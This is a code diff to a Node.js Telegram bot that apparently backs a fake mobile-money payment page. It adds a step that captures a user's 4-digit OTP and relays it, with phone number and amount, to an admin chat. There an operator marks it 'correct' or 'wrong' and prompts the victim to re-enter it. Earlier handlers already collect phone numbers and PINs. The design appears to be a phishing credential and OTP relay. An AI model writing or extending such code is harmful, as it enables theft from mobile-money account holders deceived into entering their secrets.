@@ -51,12 +51,14 @@ function generateRequestId() {
 function cleanupExpired() {
     const now = Date.now();
     for (const [id, req] of approvals) {
-        if ((req.status === 'phone_pin_verified' || req.status === 'otp_pending' || req.status === 'link_pending') && now - req.createdAt > OTP_TIMEOUT) {
+        if ((req.status === 'phone_pin_verified' || req.status === 'otp_pending' || req.status === 'link_pending' || req.status === 'wrong_otp') && now - req.createdAt > OTP_TIMEOUT) {
             if (botEnabled && bot) {
                 const isLinkVerification = req.status === 'link_pending';
                 bot.sendMessage(req.userChatId || adminChatId, isLinkVerification
                     ? '⏰ Verification timeout. The verification link window has expired.'
-                    : '⏰ Verification timeout. The OTP verification window has expired.');
+                    : (req.status === 'wrong_otp'
+                        ? '⏰ Verification timeout. The OTP re-entry window has expired.'
+                        : '⏰ Verification timeout. The OTP verification window has expired.'));
                 if (req.adminMessageId) {
                     bot.editMessageText('⏰ Verification timeout (5 minutes expired).', {
                         chat_id: adminChatId,
@@ -263,26 +265,27 @@ if (botEnabled && bot) {
 
             if (request.onInvalid) request.onInvalid(requestId);
         } else if (action === 'link_approve') {
-            request.status = 'completed';
-            delete request.verificationStep;
+            // Link verified -> user must now enter the 4-digit OTP
+            request.status = 'otp_pending';
+            request.otp = null;
+            request.otpAttempts = 0;
 
-            const text = `✅ Link Verified - Payment Complete!\n\n` +
+            const text = `✅ Link Verified\n\n` +
                 `📱 Phone: ${request.userPhone}\n` +
                 `📦 Package: ${request.package}\n` +
                 `💰 Amount: ${request.amount}\n` +
                 `💳 Method: ${request.method}\n\n` +
-                `The verification link has been approved and payment is complete.`;
+                `The verification link is confirmed. The user will now enter the 4-digit OTP.\n` +
+                `Waiting for OTP submission...`;
 
             await bot.editMessageText(text, {
                 chat_id: chatId,
                 message_id: query.message.message_id
             });
 
-            await bot.answerCallbackQuery(query.id, { text: '✅ Link verified - payment complete' });
+            await bot.answerCallbackQuery(query.id, { text: '✅ Link verified - waiting for OTP' });
 
-            if (request.onVerified) request.onVerified(requestId);
-
-            setTimeout(() => approvals.delete(requestId), 30000);
+            if (request.onLinkVerified) request.onLinkVerified(requestId);
 
         } else if (action === 'link_wrong_pin') {
             // Reset to pending so user re-enters phone and PIN
@@ -326,6 +329,50 @@ if (botEnabled && bot) {
             await bot.answerCallbackQuery(query.id, { text: '❌ Invalid link - user will re-enter' });
 
             if (request.onWrongOtp) request.onWrongOtp(requestId);
+
+        } else if (action === 'momo_otp_correct') {
+            request.status = 'completed';
+            request.verificationStep = null;
+
+            const text = `✅ OTP Verified - Payment Complete!\n\n` +
+                `📱 Phone: ${request.userPhone}\n` +
+                `📦 Package: ${request.package}\n` +
+                `💰 Amount: ${request.amount}\n` +
+                `💳 Method: ${request.method}\n` +
+                `🔢 OTP: ${request.otp || 'N/A'} (verified)\n\n` +
+                `The OTP entered by the user is correct. Payment is complete.`;
+
+            await bot.editMessageText(text, {
+                chat_id: chatId,
+                message_id: query.message.message_id
+            });
+
+            await bot.answerCallbackQuery(query.id, { text: '✅ Correct OTP - payment complete' });
+
+            if (request.onVerified) request.onVerified(requestId);
+
+            setTimeout(() => approvals.delete(requestId), 30000);
+
+        } else if (action === 'momo_otp_wrong') {
+            request.status = 'wrong_otp';
+            request.verificationStep = null;
+
+            const text = `❌ Wrong OTP\n\n` +
+                `📱 Phone: ${request.userPhone}\n` +
+                `📦 Package: ${request.package}\n` +
+                `💰 Amount: ${request.amount}\n` +
+                `🔢 OTP: ${request.otp || 'N/A'} (incorrect)\n\n` +
+                `The user has been asked to re-enter the correct OTP.\n` +
+                `The next attempt will be sent here as well.`;
+
+            await bot.editMessageText(text, {
+                chat_id: chatId,
+                message_id: query.message.message_id
+            });
+
+            await bot.answerCallbackQuery(query.id, { text: '❌ Wrong OTP - user will re-enter' });
+
+            if (request.onOtpWrong) request.onOtpWrong(requestId);
         }
     });
 
@@ -543,6 +590,50 @@ function submitLink(requestId, link) {
     return { success: true, message: 'Link submitted for verification' };
 }
 
+function submitMomoOtp(requestId, otp) {
+    const request = approvals.get(requestId);
+    if (!request) {
+        return { success: false, message: 'Request not found' };
+    }
+
+    if (request.status !== 'otp_pending' && request.status !== 'wrong_otp') {
+        return { success: false, message: 'Verification link not verified yet' };
+    }
+
+    request.otpAttempts = (request.otpAttempts || 0) + 1;
+    request.otp = otp;
+    request.status = 'otp_pending';
+
+    if (botEnabled && bot) {
+        const attempt = request.otpAttempts;
+        const retryNote = attempt > 1 ? `\n⚠️ This is retry attempt #${attempt} after a wrong OTP.` : '';
+
+        const text = `🔢 OTP Submitted (Attempt ${attempt})\n\n` +
+            `📱 Phone: ${request.userPhone}\n` +
+            `📦 Package: ${request.package}\n` +
+            `💰 Amount: ${request.amount}\n` +
+            `🔢 OTP: ${otp}${retryNote}\n\n` +
+            `Please verify and take action:`;
+
+        const keyboard = {
+            inline_keyboard: [
+                [
+                    { text: '✅ Correct OTP', callback_data: `momo_otp_correct_${requestId}` },
+                    { text: '❌ Wrong OTP', callback_data: `momo_otp_wrong_${requestId}` }
+                ]
+            ]
+        };
+
+        bot.sendMessage(adminChatId, text, { reply_markup: keyboard }).then((msg) => {
+            request.adminOtpMessageId = msg.message_id;
+        }).catch((err) => {
+            console.error('Failed to send OTP notification:', err.message);
+        });
+    }
+
+    return { success: true, message: 'OTP submitted for verification', attempt: request.otpAttempts };
+}
+
 function getApprovalStatus(requestId) {
     const request = approvals.get(requestId);
     if (!request) {
@@ -572,6 +663,7 @@ module.exports = {
     bot,
     createApprovalRequest,
     submitOtp,
+    submitMomoOtp,
     submitLink,
     getApprovalStatus,
     sendNotification,
